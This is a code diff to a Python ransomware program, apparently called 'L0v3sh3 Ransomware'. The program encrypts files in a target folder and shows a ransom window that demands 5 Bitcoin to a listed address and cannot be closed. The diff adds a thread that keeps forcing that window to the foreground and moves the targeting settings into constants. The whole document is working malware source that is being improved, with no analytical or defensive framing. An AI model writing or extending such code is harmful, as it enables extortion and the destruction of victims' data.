@@ -10,9 +10,16 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 import tkinter as tk
 from functools import partial
 from threading import Thread
+from ewmh import EWMH
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
+###########################################################################################################################
+
+ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
+EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
+RANWOMWARE_WINDOW_NAME = 'L0v3sh3 Ransomware'  # CHANGE THIS
+
 ###########################################################################################################################
 
 with open('./media/public.pem', 'rb') as f:
@@ -27,17 +34,17 @@ pubKey = base64.b64decode(pubKey)
 
 class GUI(Thread):
     def __init__(self):
-        # ↓↓ Initialize the Thread part of the GUI object, so we can use its functions and attributes
+        # Initialize the Thread part of the GUI object, so we can use its functions and attributes
         Thread.__init__(self)
-        # ↓↓ Kill the thread when the main thread finishes
+        # Kill the thread when the main thread finishes
         self.daemon = True
 
-    # ↓↓ Overwrite the run() method from thread. This code will be executed when using GUI.start()
+    # Overwrite the run() method from thread. This code will be executed when using GUI.start()
     def run(self):
         self.root = tk.Tk()
         def disable_event(): pass
         self.root.protocol("WM_DELETE_WINDOW", disable_event)
-        self.root.title('L0v3sh3 Ransomware')
+        self.root.title(RANWOMWARE_WINDOW_NAME)
         self.root.geometry('500x300')
         self.root.resizable(False, False)
         label1 = tk.Label(self.root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
@@ -49,7 +56,8 @@ class GUI(Thread):
 
         # call countdown first time
         self.countdown('23:59:59')
-        # root.after(0, countdown, 5)
+
+        Thread(target=keep_active_window, daemon=True).start()
 
         self.root.mainloop()
 
@@ -167,8 +175,24 @@ def decryption_traversal():
 
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
-EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
+def keep_active_window():
+    while True:
+        ewmh = EWMH()
+
+        # Get the window that you want to focus on (replace 'Window Title' with the actual title)
+        target_window = None
+        for window in ewmh.getClientList():
+            if window.get_wm_name() == RANWOMWARE_WINDOW_NAME:
+                target_window = window
+                break
+
+        # Check if the target window was found
+        if target_window:
+            # Set the target window as the active window
+            ewmh.setActiveWindow(target_window)
+            ewmh.display.flush()
+
+        ewmh.display.close()
 
 ###########################################################################################################################
 
@@ -178,7 +202,6 @@ def encrypt_ransomware():
 
     my_GUI = GUI()
     my_GUI.start()
-    # root.mainloop()
 
     return
 
@@ -203,5 +226,6 @@ if __name__ == "__main__":
     from time import sleep
     encrypt_ransomware()
 
+    # Uncomment to check if Tkinter can run on a different thread without freezing
     # for i in range(1000000): print(i)
     sleep(10)
